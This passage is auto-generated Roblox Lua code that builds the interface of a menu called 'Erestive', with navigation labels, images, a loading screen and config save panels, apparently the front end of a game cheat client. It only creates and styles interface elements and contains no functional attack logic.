-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.Image.NEW.TextLabel
G2L["4d9"] = Instance.new("TextLabel", G2L["4d7"]);
G2L["4d9"]["TextWrapped"] = true;
G2L["4d9"]["BorderSizePixel"] = 0;
G2L["4d9"]["TextSize"] = 14;
G2L["4d9"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d9"]["TextScaled"] = true;
G2L["4d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d9"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d9"]["BackgroundTransparency"] = 1;
G2L["4d9"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d9"]["Text"] = [[!]];


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.Image.NEW.TextLabel.UIStroke
G2L["4da"] = Instance.new("UIStroke", G2L["4d9"]);
G2L["4da"]["Thickness"] = 0.43;
G2L["4da"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.TextLabel
G2L["4db"] = Instance.new("TextLabel", G2L["4d3"]);
G2L["4db"]["TextWrapped"] = true;
G2L["4db"]["BorderSizePixel"] = 0;
G2L["4db"]["TextSize"] = 16;
G2L["4db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4db"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4db"]["TextColor3"] = Color3.fromRGB(69, 68, 66);
G2L["4db"]["BackgroundTransparency"] = 1;
G2L["4db"]["Size"] = UDim2.new(0.71458, 0, 1, 0);
G2L["4db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4db"]["Text"] = [[Legitbot]];
G2L["4db"]["Position"] = UDim2.new(0.14729, 0, -0.60797, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.2ScrollingFrame.6Frame.UIListLayout
G2L["4dc"] = Instance.new("UIListLayout", G2L["4d3"]);
G2L["4dc"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4dc"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["4dc"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.NavFrame.UIListLayout
G2L["4dd"] = Instance.new("UIListLayout", G2L["49d"]);
G2L["4dd"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4dd"]["Padding"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame
G2L["4de"] = Instance.new("Frame", G2L["49d"]);
G2L["4de"]["BorderSizePixel"] = 0;
G2L["4de"]["BackgroundColor3"] = Color3.fromRGB(92, 126, 235);
G2L["4de"]["Size"] = UDim2.new(1, 0, 0.13564, 0);
G2L["4de"]["Position"] = UDim2.new(-0, 0, 0.81654, 0);
G2L["4de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4de"]["Name"] = [[3Frame]];
G2L["4de"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.UIPadding
G2L["4df"] = Instance.new("UIPadding", G2L["4de"]);
G2L["4df"]["PaddingTop"] = UDim.new(0, 5);
G2L["4df"]["PaddingRight"] = UDim.new(0, 5);
G2L["4df"]["PaddingLeft"] = UDim.new(0, 5);
G2L["4df"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextLabel
G2L["4e0"] = Instance.new("TextLabel", G2L["4de"]);
G2L["4e0"]["TextWrapped"] = true;
G2L["4e0"]["BorderSizePixel"] = 0;
G2L["4e0"]["TextSize"] = 14;
G2L["4e0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4e0"]["TextScaled"] = true;
G2L["4e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4e0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e0"]["BackgroundTransparency"] = 1;
G2L["4e0"]["Size"] = UDim2.new(0, 96, 0, 19);
G2L["4e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e0"]["Text"] = [[Erestive]];
G2L["4e0"]["Position"] = UDim2.new(0.34003, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextLabel.LocalScript
G2L["4e1"] = Instance.new("LocalScript", G2L["4e0"]);



-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextLabel.UIStroke
G2L["4e2"] = Instance.new("UIStroke", G2L["4e0"]);
G2L["4e2"]["Thickness"] = 2;
G2L["4e2"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.Display
G2L["4e3"] = Instance.new("TextLabel", G2L["4de"]);
G2L["4e3"]["TextWrapped"] = true;
G2L["4e3"]["BorderSizePixel"] = 0;
G2L["4e3"]["TextSize"] = 14;
G2L["4e3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["4e3"]["TextScaled"] = true;
G2L["4e3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Regular, Enum.FontStyle.Italic);
G2L["4e3"]["TextColor3"] = Color3.fromRGB(157, 157, 157);
G2L["4e3"]["BackgroundTransparency"] = 1;
G2L["4e3"]["Size"] = UDim2.new(0, 96, 0, 19);
G2L["4e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e3"]["Text"] = [[Config]];
G2L["4e3"]["Name"] = [[Display]];
G2L["4e3"]["Position"] = UDim2.new(0.34003, 0, 0.40588, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.Display.UIStroke
G2L["4e4"] = Instance.new("UIStroke", G2L["4e3"]);
G2L["4e4"]["Thickness"] = 2;
G2L["4e4"]["Color"] = Color3.fromRGB(31, 32, 36);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.ImageLabel
G2L["4e5"] = Instance.new("ImageLabel", G2L["4de"]);
G2L["4e5"]["BorderSizePixel"] = 0;
G2L["4e5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4e5"]["Image"] = [[rbxassetid://110239292064802]];
G2L["4e5"]["Size"] = UDim2.new(0, 45, 0, 45);
G2L["4e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e5"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.ImageLabel.UICorner
G2L["4e6"] = Instance.new("UICorner", G2L["4e5"]);



-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextButton
G2L["4e7"] = Instance.new("TextButton", G2L["4de"]);
G2L["4e7"]["BorderSizePixel"] = 0;
G2L["4e7"]["TextTransparency"] = 1;
G2L["4e7"]["TextSize"] = 14;
G2L["4e7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e7"]["BackgroundTransparency"] = 1;
G2L["4e7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.NavFrame.3Frame.TextButton.LocalScript
G2L["4e8"] = Instance.new("LocalScript", G2L["4e7"]);
G2L["4e8"]["Enabled"] = false;
G2L["4e8"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.NavFrame.UICorner
G2L["4e9"] = Instance.new("UICorner", G2L["49d"]);
G2L["4e9"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.MainFrame.UICorner
G2L["4ea"] = Instance.new("UICorner", G2L["a5"]);
G2L["4ea"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.MainFrame.UIStroke
G2L["4eb"] = Instance.new("UIStroke", G2L["a5"]);
G2L["4eb"]["Enabled"] = false;
G2L["4eb"]["Transparency"] = 0.6;
G2L["4eb"]["Thickness"] = 4;
G2L["4eb"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.MainFrame.UIAspectRatioConstraint
G2L["4ec"] = Instance.new("UIAspectRatioConstraint", G2L["a5"]);
G2L["4ec"]["AspectRatio"] = 1.556;


-- StarterGui.Erestive.MainFrame.Loading
G2L["4ed"] = Instance.new("Frame", G2L["a5"]);
G2L["4ed"]["Visible"] = false;
G2L["4ed"]["BorderSizePixel"] = 0;
G2L["4ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4ed"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4ed"]["Name"] = [[Loading]];
G2L["4ed"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.Loading.ImageLabel
G2L["4ee"] = Instance.new("ImageLabel", G2L["4ed"]);
G2L["4ee"]["BorderSizePixel"] = 0;
G2L["4ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4ee"]["Image"] = [[rbxassetid://1078907462]];
G2L["4ee"]["Size"] = UDim2.new(0, 141, 0, 141);
G2L["4ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4ee"]["BackgroundTransparency"] = 1;
G2L["4ee"]["Position"] = UDim2.new(0.37717, 0, 0.3094, 0);


-- StarterGui.Erestive.MainFrame.Loading.ImageLabel.LocalScript
G2L["4ef"] = Instance.new("LocalScript", G2L["4ee"]);
G2L["4ef"]["Enabled"] = false;
G2L["4ef"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.Loading.ImageLabel.UICorner
G2L["4f0"] = Instance.new("UICorner", G2L["4ee"]);
G2L["4f0"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Erestive.MainFrame.Loading.ImageLabel.UIAspectRatioConstraint
G2L["4f1"] = Instance.new("UIAspectRatioConstraint", G2L["4ee"]);



-- StarterGui.Erestive.MainFrame.Loading.Logo
G2L["4f2"] = Instance.new("ImageLabel", G2L["4ed"]);
G2L["4f2"]["BorderSizePixel"] = 0;
G2L["4f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f2"]["ImageTransparency"] = 1;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4f2"]["Image"] = [[rbxassetid://109704029525721]];
G2L["4f2"]["Size"] = UDim2.new(0, 154, 0, 154);
G2L["4f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f2"]["BackgroundTransparency"] = 1;
G2L["4f2"]["Name"] = [[Logo]];
G2L["4f2"]["Position"] = UDim2.new(0.37717, 0, 0.3094, 0);


-- StarterGui.Erestive.MainFrame.Loading.Logo.UICorner
G2L["4f3"] = Instance.new("UICorner", G2L["4f2"]);
G2L["4f3"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Erestive.MainFrame.Loading.Logo.UIAspectRatioConstraint
G2L["4f4"] = Instance.new("UIAspectRatioConstraint", G2L["4f2"]);



-- StarterGui.Erestive.MainFrame.ImageLabel
G2L["4f5"] = Instance.new("ImageLabel", G2L["a5"]);
G2L["4f5"]["ZIndex"] = -888;
G2L["4f5"]["BorderSizePixel"] = 0;
G2L["4f5"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["4f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4f5"]["Image"] = [[rbxassetid://129962492327343]];
G2L["4f5"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f5"]["BackgroundTransparency"] = 1;
G2L["4f5"]["Rotation"] = 180;


-- StarterGui.Erestive.MainFrame.ImageLabel.UIAspectRatioConstraint
G2L["4f6"] = Instance.new("UIAspectRatioConstraint", G2L["4f5"]);
G2L["4f6"]["AspectRatio"] = 1.556;


-- StarterGui.Erestive.MainFrame.Frame
G2L["4f7"] = Instance.new("Frame", G2L["a5"]);
G2L["4f7"]["ZIndex"] = 2;
G2L["4f7"]["BorderSizePixel"] = 0;
G2L["4f7"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["4f7"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4f7"]["Position"] = UDim2.new(0, 0, -0.09992, 0);
G2L["4f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.Frame.ImageLabel
G2L["4f8"] = Instance.new("ImageLabel", G2L["4f7"]);
G2L["4f8"]["ZIndex"] = -888;
G2L["4f8"]["BorderSizePixel"] = 0;
G2L["4f8"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["4f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f8"]["ImageTransparency"] = 0.27;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4f8"]["ImageColor3"] = Color3.fromRGB(158, 158, 158);
G2L["4f8"]["Image"] = [[rbxassetid://129962492327343]];
G2L["4f8"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["4f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f8"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.Frame.ImageLabel.UICorner
G2L["4f9"] = Instance.new("UICorner", G2L["4f8"]);
G2L["4f9"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.MainFrame.Frame.UIStroke
G2L["4fa"] = Instance.new("UIStroke", G2L["4f7"]);
G2L["4fa"]["Enabled"] = false;
G2L["4fa"]["Transparency"] = 0.6;
G2L["4fa"]["Thickness"] = 4;
G2L["4fa"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.MainFrame.Frame.UICorner
G2L["4fb"] = Instance.new("UICorner", G2L["4f7"]);
G2L["4fb"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.MainFrame.Frame.Frame
G2L["4fc"] = Instance.new("Frame", G2L["4f7"]);
G2L["4fc"]["BorderSizePixel"] = 0;
G2L["4fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4fc"]["Size"] = UDim2.new(0, 629, 0, 40);
G2L["4fc"]["Position"] = UDim2.new(0, 0, 0.35294, 0);
G2L["4fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4fc"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.Frame.Frame.1A1
G2L["4fd"] = Instance.new("TextLabel", G2L["4fc"]);
G2L["4fd"]["TextWrapped"] = true;
G2L["4fd"]["ZIndex"] = 999999991;
G2L["4fd"]["BorderSizePixel"] = 0;
G2L["4fd"]["TextSize"] = 28;
G2L["4fd"]["TextTransparency"] = 0.16;
G2L["4fd"]["BackgroundColor3"] = Color3.fromRGB(89, 89, 89);
G2L["4fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["4fd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4fd"]["BackgroundTransparency"] = 1;
G2L["4fd"]["Size"] = UDim2.new(0.27822, 0, 0.91381, 0);
G2L["4fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4fd"]["Text"] = [[Erestive • 4.2]];
G2L["4fd"]["Name"] = [[1A1]];
G2L["4fd"]["Position"] = UDim2.new(0.45628, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.Frame.Frame.1A1.UICorner
G2L["4fe"] = Instance.new("UICorner", G2L["4fd"]);



-- StarterGui.Erestive.MainFrame.Frame.Frame.1A1.UIAspectRatioConstraint
G2L["4ff"] = Instance.new("UIAspectRatioConstraint", G2L["4fd"]);
G2L["4ff"]["AspectRatio"] = 4.78766;


-- StarterGui.Erestive.MainFrame.Frame.Frame.1
G2L["500"] = Instance.new("ImageLabel", G2L["4fc"]);
G2L["500"]["BorderSizePixel"] = 0;
G2L["500"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["500"]["ImageTransparency"] = 0.16;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["500"]["Image"] = [[rbxassetid://123207633122531]];
G2L["500"]["Size"] = UDim2.new(0, 40, 0, 40);
G2L["500"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["500"]["BackgroundTransparency"] = 1;
G2L["500"]["Name"] = [[1]];


-- StarterGui.Erestive.MainFrame.Frame.Frame.1.UIAspectRatioConstraint
G2L["501"] = Instance.new("UIAspectRatioConstraint", G2L["500"]);



-- StarterGui.Erestive.MainFrame.Frame.Frame.UIListLayout
G2L["502"] = Instance.new("UIListLayout", G2L["4fc"]);
G2L["502"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["502"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.Frame.Frame.UIAspectRatioConstraint
G2L["503"] = Instance.new("UIAspectRatioConstraint", G2L["4fc"]);
G2L["503"]["AspectRatio"] = 15.725;


-- StarterGui.Erestive.MainFrame.Frame.UIAspectRatioConstraint
G2L["504"] = Instance.new("UIAspectRatioConstraint", G2L["4f7"]);
G2L["504"]["AspectRatio"] = 29.95238;


-- StarterGui.Erestive.MainFrame.Frame
G2L["505"] = Instance.new("Frame", G2L["a5"]);
G2L["505"]["BorderSizePixel"] = 0;
G2L["505"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["505"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["505"]["Position"] = UDim2.new(0, 0, -0.08161, 0);
G2L["505"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.Frame.UIDrag
G2L["506"] = Instance.new("LocalScript", G2L["505"]);
G2L["506"]["Name"] = [[UIDrag]];


-- StarterGui.Erestive.MainFrame.Frame.UIStroke
G2L["507"] = Instance.new("UIStroke", G2L["505"]);
G2L["507"]["Enabled"] = false;
G2L["507"]["Transparency"] = 0.6;
G2L["507"]["Thickness"] = 4;
G2L["507"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.MainFrame.Frame.ImageLabel
G2L["508"] = Instance.new("ImageLabel", G2L["505"]);
G2L["508"]["BorderSizePixel"] = 0;
G2L["508"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["508"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["508"]["ImageTransparency"] = 0.27;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["508"]["ImageColor3"] = Color3.fromRGB(158, 158, 158);
G2L["508"]["Image"] = [[rbxassetid://129962492327343]];
G2L["508"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["508"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["508"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.Frame.UIAspectRatioConstraint
G2L["509"] = Instance.new("UIAspectRatioConstraint", G2L["505"]);
G2L["509"]["AspectRatio"] = 15.34146;


-- StarterGui.Erestive.MainFrame.cfg
G2L["50a"] = Instance.new("ScrollingFrame", G2L["a5"]);
G2L["50a"]["Visible"] = false;
G2L["50a"]["Active"] = true;
G2L["50a"]["BorderSizePixel"] = 0;
G2L["50a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["50a"]["Name"] = [[cfg]];
G2L["50a"]["ScrollBarImageTransparency"] = 1;
G2L["50a"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["50a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["50a"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50a"]["ScrollBarThickness"] = 0;


-- StarterGui.Erestive.MainFrame.cfg.cfgsys
G2L["50b"] = Instance.new("LocalScript", G2L["50a"]);
G2L["50b"]["Enabled"] = false;
G2L["50b"]["Name"] = [[cfgsys]];
G2L["50b"]["Disabled"] = true;


-- StarterGui.Erestive.MainFrame.cfg.UIPadding
G2L["50c"] = Instance.new("UIPadding", G2L["50a"]);
G2L["50c"]["PaddingTop"] = UDim.new(0, 5);
G2L["50c"]["PaddingRight"] = UDim.new(0, 5);
G2L["50c"]["PaddingLeft"] = UDim.new(0, 5);
G2L["50c"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.MainFrame.cfg.Save
G2L["50d"] = Instance.new("Frame", G2L["50a"]);
G2L["50d"]["BorderSizePixel"] = 0;
G2L["50d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50d"]["Size"] = UDim2.new(0, 213, 0, 394);
G2L["50d"]["Position"] = UDim2.new(0, 0, -0, 0);
G2L["50d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50d"]["Name"] = [[Save]];


-- StarterGui.Erestive.MainFrame.cfg.Save.ScrollingFrame
G2L["50e"] = Instance.new("ScrollingFrame", G2L["50d"]);
G2L["50e"]["Active"] = true;
G2L["50e"]["BorderSizePixel"] = 0;
G2L["50e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["50e"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.cfg.Save.ScrollingFrame.UIListLayout
G2L["50f"] = Instance.new("UIListLayout", G2L["50e"]);
G2L["50f"]["Padding"] = UDim.new(0, 30);


-- StarterGui.Erestive.MainFrame.cfg.Save.ScrollingFrame.TextButton
G2L["510"] = Instance.new("TextButton", G2L["50e"]);
G2L["510"]["BorderSizePixel"] = 0;
G2L["510"]["TextSize"] = 14;
G2L["510"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["510"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["510"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["510"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["510"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.cfg.Save.ScrollingFrame.TextBox
G2L["511"] = Instance.new("TextBox", G2L["50e"]);
G2L["511"]["BorderSizePixel"] = 0;
G2L["511"]["TextSize"] = 14;
G2L["511"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["511"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["511"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["511"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["511"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.MainFrame.cfg.UIListLayout
G2L["512"] = Instance.new("UIListLayout", G2L["50a"]);
G2L["512"]["Padding"] = UDim.new(0, 30);
G2L["512"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["512"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.MainFrame.cfg.Cfgs
G2L["513"] = Instance.new("Frame", G2L["50a"]);
G2L["513"]["BorderSizePixel"] = 0;
G2L["513"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["513"]["Size"] = UDim2.new(0, 264, 0, 394);
G2L["513"]["Position"] = UDim2.new(0.49859, 0, 0.005, 0);
G2L["513"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["513"]["Name"] = [[Cfgs]];


-- StarterGui.Erestive.MainFrame.cfg.Cfgs.ScrollingFrame
G2L["514"] = Instance.new("ScrollingFrame", G2L["513"]);
G2L["514"]["Active"] = true;
G2L["514"]["BorderSizePixel"] = 0;
G2L["514"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["514"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["514"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["514"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["514"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.MainFrame.cfg.Cfgs.ScrollingFrame.UIListLayout
G2L["515"] = Instance.new("UIListLayout", G2L["514"]);
G2L["515"]["Padding"] = UDim.new(0, 30);


-- StarterGui.Erestive.MainFrame.cfg.TextButton
G2L["516"] = Instance.new("TextButton", G2L["50a"]);
G2L["516"]["BorderSizePixel"] = 0;
G2L["516"]["TextTransparency"] = 1;
G2L["516"]["TextSize"] = 14;
G2L["516"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["516"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 0);
G2L["516"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["516"]["Size"] = UDim2.new(0.11521, 0, 0.98068, 0);
G2L["516"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["516"]["Position"] = UDim2.new(0.86648, 0, 0, 0);


-- StarterGui.Erestive.MainFrame.cfg.TextButton.LocalScript
G2L["517"] = Instance.new("LocalScript", G2L["516"]);



-- StarterGui.Erestive.InformationText
G2L["518"] = Instance.new("Frame", G2L["1"]);
G2L["518"]["ZIndex"] = 999999992;
G2L["518"]["BorderSizePixel"] = 0;
G2L["518"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["518"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["518"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["518"]["Name"] = [[InformationText]];
G2L["518"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.UIListLayout
G2L["519"] = Instance.new("UIListLayout", G2L["518"]);
G2L["519"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["519"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Erestive.InformationText.UIPadding
G2L["51a"] = Instance.new("UIPadding", G2L["518"]);
G2L["51a"]["PaddingLeft"] = UDim.new(0, 5);
G2L["51a"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.InformationText.DT
G2L["51b"] = Instance.new("Frame", G2L["518"]);
G2L["51b"]["Visible"] = false;
G2L["51b"]["BorderSizePixel"] = 0;
G2L["51b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51b"]["Size"] = UDim2.new(0, 57, 0, 28);
G2L["51b"]["Position"] = UDim2.new(0, 0, 0.44909, 0);
G2L["51b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51b"]["Name"] = [[DT]];
G2L["51b"]["LayoutOrder"] = 1;
G2L["51b"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.InformationText.DT.TextLabel
G2L["51c"] = Instance.new("TextLabel", G2L["51b"]);
G2L["51c"]["TextWrapped"] = true;
G2L["51c"]["TextStrokeTransparency"] = 0.58;
G2L["51c"]["BorderSizePixel"] = 0;
G2L["51c"]["TextSize"] = 14;
G2L["51c"]["TextScaled"] = true;
G2L["51c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["51c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51c"]["BackgroundTransparency"] = 1;
G2L["51c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["51c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51c"]["Text"] = [[DT]];
G2L["51c"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.InformationText.DT.TextLabel.UIPadding
G2L["51d"] = Instance.new("UIPadding", G2L["51c"]);
G2L["51d"]["PaddingTop"] = UDim.new(0, 2);
G2L["51d"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.InformationText.DT.TextLabel.Frame
G2L["51e"] = Instance.new("Frame", G2L["51c"]);
G2L["51e"]["BorderSizePixel"] = 0;
G2L["51e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51e"]["Size"] = UDim2.new(1, 0, -0.08333, 0);
G2L["51e"]["Position"] = UDim2.new(0, 0, 1.08333, 0);
G2L["51e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Erestive.InformationText.DT.UIListLayout
G2L["51f"] = Instance.new("UIListLayout", G2L["51b"]);
